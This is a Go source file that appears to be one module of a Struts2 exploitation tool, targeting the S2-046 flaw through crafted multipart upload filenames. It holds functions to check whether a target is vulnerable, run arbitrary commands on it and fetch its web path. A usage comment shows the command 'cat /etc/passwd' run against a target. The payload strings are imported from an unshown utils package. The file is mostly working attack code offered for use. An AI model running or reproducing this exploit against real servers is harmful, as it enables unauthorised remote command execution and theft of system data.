package s046

import (
	"ST2G/cvemod/utils"
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-046/doUpload.action --vn 46 --mode exec --cmd "cat /etc/passwd"
 */
func Check(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_check)
	if err != nil {}
	_ = writer.WriteField("", "")
	writer.Close()
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	isVulable := strings.Contains(respBody, utils.Checkflag)
	if isVulable {
		color.Red("*Found Struts2-046！")
	} else {
		fmt.Println("Struts2-046 Not Vulnerable.")
	}
}
func ExecCommand(url string, command string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_exec(command))
	if err != nil {}
	_ = writer.WriteField("", "")
	writer.Close()
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println(respBody)
}

func GetWebpath(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_webpath)
	if err != nil {}
	_ = writer.WriteField("", "")
	writer.Close()
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println(respBody)
}
